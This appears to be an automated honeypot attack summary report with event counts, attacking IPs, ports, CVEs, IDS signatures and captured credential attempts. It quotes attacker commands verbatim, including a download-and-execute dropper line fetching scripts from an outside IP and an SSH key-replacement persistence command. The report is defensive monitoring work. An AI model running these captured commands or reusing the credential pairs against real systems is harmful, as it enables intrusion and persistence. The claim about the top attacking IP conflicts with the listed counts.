**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-09T09:01:29Z
**Timeframe:** 2025-10-09T08:20:01Z to 2025-10-09T09:00:02Z
**Files Used:**
*   agg_log_20251009T082001Z.json
*   agg_log_20251009T084001Z.json
*   agg_log_20251009T090002Z.json

**Executive Summary**

This report summarizes 16,223 events recorded across the honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute-force attacks and command execution attempts. A significant number of attacks were also observed on Mailoney and Honeytrap, suggesting SMTP and other service-based attacks. The most frequent attacks originated from IP address `86.54.42.238`, and the most targeted port was port 25 (SMTP). Attackers attempted to exploit several vulnerabilities, with `CVE-2002-0012` and `CVE-2002-0013` being the most common. A variety of commands were executed, primarily focused on reconnaissance and establishing persistence.

**Detailed Analysis**

***

**Attacks by Honeypot**

*   **Cowrie:** 6025
*   **Honeytrap:** 3225
*   **Mailoney:** 1691
*   **Suricata:** 2154
*   **Ciscoasa:** 1685
*   **Sentrypeer:** 636
*   **Dionaea:** 577
*   **Tanner:** 70
*   **H0neytr4p:** 49
*   **Honeyaml:** 42
*   **Adbhoney:** 17
*   **Redishoneypot:** 20
*   **Dicompot:** 11
*   **ConPot:** 10
*   **ElasticPot:** 6
*   **Heralding:** 3
*   **Miniprint:** 2

***

**Top Attacking IPs**

*   86.54.42.238: 821
*   176.65.141.117: 820
*   167.250.224.25: 734
*   80.94.95.238: 945
*   78.31.71.38: 596
*   118.194.235.169: 356
*   42.200.66.164: 292
*   103.25.47.94: 292
*   45.175.157.53: 203
*   118.123.1.40: 186
*   115.242.61.98: 171
*   80.253.31.232: 154
*   198.46.249.175: 139
*   212.25.35.66: 129
*   88.97.77.174: 126
*   77.105.182.78: 124
*   115.84.183.242: 214
*   192.3.159.176: 124
*   79.61.112.234: 213
*   191.223.75.89: 174

***

**Top Targeted Ports/Protocols**

*   25: 1691
*   22: 834
*   5060: 636
*   5903: 203
*   8333: 141
*   445: 76
*   TCP/21: 100
*   80: 82
*   5901: 74
*   23: 43
*   443: 44
*   UDP/5060: 45
*   5908: 50
*   5909: 49
*   5907: 49
*   TCP/22: 38
*   TCP/80: 28
*   2052: 21
*   8081: 21
*   17001: 16
*   UDP/161: 16
*   17000: 14
*   6379: 14
*   8088: 14
*   8888: 11

***

**Most Common CVEs**

*   CVE-2002-0013 CVE-2002-0012: 10
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 7
*   CVE-2021-3449 CVE-2021-3449: 3
*   CVE-2019-11500 CVE-2019-11500: 2
*   CVE-1999-0183: 2
*   CVE-2006-3602 CVE-2006-4458 CVE-2006-4542: 1

***

**Commands Attempted by Attackers**

*   uname -a: 33
*   cd ~; chattr -ia .ssh; lockr -ia .ssh: 31
*   lockr -ia .ssh: 31
*   cat /proc/cpuinfo | grep name | wc -l: 31
*   Enter new UNIX password: : 31
*   Enter new UNIX password:": 31
*   cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 31
*   free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 31
*   ls -lh $(which ls): 31
*   which ls: 31
*   crontab -l: 31
*   w: 30
*   uname -m: 30
*   cat /proc/cpuinfo | grep model | grep name | wc -l: 30
*   top: 30
*   uname: 30
*   whoami: 30
*   lscpu | grep Model: 30
*   df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 30
*   cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...": 30
*   cd /data/local/tmp/; busybox wget http://141.98.10.66/bins/w.sh; sh w.sh; curl http://141.98.10.66/bins/c.sh; sh c.sh: 3

***

**Signatures Triggered**

*   ET SCAN MS Terminal Server Traffic on Non-standard Port: 612
*   2023753: 612
*   ET DROP Dshield Block Listed Source group 1: 499
*   2402000: 499
*   ET SCAN NMAP -sS window 1024: 158
*   2009582: 158
*   ET INFO Reserved Internal IP Traffic: 61
*   2002752: 61
*   ET FTP FTP CWD command attempt without login: 50
*   2010731: 50
*   ET FTP FTP PWD command attempt without login: 49
*   2010735: 49
*   ET CINS Active Threat Intelligence Poor Reputation IP group 48: 27
*   2403347: 27
*   ET SCAN Potential SSH Scan: 22
*   2001219: 22
*   ET CINS Active Threat Intelligence Poor Reputation IP group 41: 21
*   2403340: 21
*   ET CINS Active Threat Intelligence Poor Reputation IP group 42: 11
*   2403341: 11
*   ET CINS Active Threat Intelligence Poor Reputation IP group 46: 10
*   2403345: 10
*   ET INFO CURL User Agent: 12
*   2002824: 12
*   ET CINS Active Threat Intelligence Poor Reputation IP group 49: 11
*   2403348: 11
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 28: 10
*   2400027: 10
*   ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source): 13
*   2010517: 13
*   ET CINS Active Threat Intelligence Poor Reputation IP group 44: 11
*   2403343: 11
*   ET CINS Active Threat Intelligence Poor Reputation IP group 67: 9
*   2403366: 9
*   ET CINS Active Threat Intelligence Poor Reputation IP group 40: 8
*   2403339: 8

***

**Users / Login Attempts**

*   root/: 126
*   345gs5662d34/345gs5662d34: 29
*   guest/guest44: 6
*   supervisor/121212: 6
*   ubnt/ubnt22: 6
*   operator/uploader: 6
*   default/default4: 6
*   root/qwer12: 6
*   default/default44: 6
*   config/config10: 4
*   support/azertyui: 4
*   root/SangomaDefaultPassword: 4
*   root/vicidial: 4
*   root/netillo123: 4
*   root/Pak123Has: 4
*   root/sistema500: 4
*   support/support2006: 4
*   root/asttecs: 4
*   supervisor/abcd1234: 4
*   root/P@ssw0rd: 4
*   support/44444: 4
*   root/P@ssw0rd@86: 4
*   root/fer.8326: 4
*   root/zaq12wsxcde3: 4
*   root/1ss4b3l: 4
*   root/1ss4b3l2025: 4
*   root/1ss4b3l!: 4
*   root/Test@123: 4
*   root/Server@12: 4

***

**Files Uploaded/Downloaded**

*   11: 24
*   fonts.gstatic.com: 24
*   css?family=Libre+Franklin...: 24
*   ie8.css?ver=1.0: 24
*   html5.js?ver=3.7.3: 24
*   parm;: 9
*   parm5;: 9
*   parm6;: 9
*   parm7;: 9
*   psh4;: 9
*   parc;: 9
*   pmips;: 9
*   pmipsel;: 9
*   psparc;: 9
*   px86_64;: 9
*   pi686;: 9
*   pi586;: 9
*   w.sh;: 3
*   c.sh;: 3

***

**HTTP User-Agents**
*   No HTTP User-Agents were logged in this timeframe.

***

**SSH Clients and Servers**
*   No specific SSH clients or servers were identified in the logs.

***

**Top Attacker AS Organizations**
*   No attacker AS organizations were logged in this timeframe.

***

**Key Observations and Anomalies**

*   The high number of events on the Mailoney honeypot is a notable anomaly, suggesting a targeted campaign against SMTP services.
*   The repeated use of the same SSH key in commands across different attacking IPs suggests a coordinated or automated attack campaign.
*   The command `cd /data/local/tmp/; busybox wget http://141.98.10.66/bins/w.sh; sh w.sh; curl http://141.98.10.66/bins/c.sh; sh c.sh` was observed, indicating attempts to download and execute malicious scripts. The source IP `141.98.10.66` should be investigated further.
*   The credentials `345gs5662d34/345gs5662d34` were attempted multiple times, which might be a default or common credential for a specific type of device or software.
*   The Suricata signatures for MS Terminal Server traffic on non-standard ports were triggered frequently, which could indicate scanning for vulnerable RDP services.

This concludes the Honeypot Attack Summary Report. Continued monitoring is recommended.